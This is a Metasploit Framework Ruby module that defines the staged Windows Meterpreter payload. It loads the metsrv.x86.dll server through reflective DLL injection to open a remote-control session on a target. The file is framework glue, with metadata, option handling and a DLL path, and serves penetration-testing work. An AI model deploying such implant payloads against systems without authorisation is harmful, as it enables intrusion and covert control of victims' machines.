##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/payload/windows/reflectivedllinject'
require 'msf/core/payload/windows/x64/reflectivedllinject'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the meterpreter server DLL via the Reflective Dll Injection payload
#
###
module Metasploit3

  include Msf::Payload::Windows::ReflectiveDllInject
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Meterpreter (Reflective Injection)',
      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)',
      'Author'        => ['skape','sf'],
      'PayloadCompat' =>
        {
          'Convention' => 'sockedi',
        },
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Win))

    # Don't let people set the library name option
    options.remove_option('LibraryName')
    options.remove_option('DLL')
  end

  def library_path
    File.join(Msf::Config.data_directory, "meterpreter", "metsrv.x86.dll")
  end

end
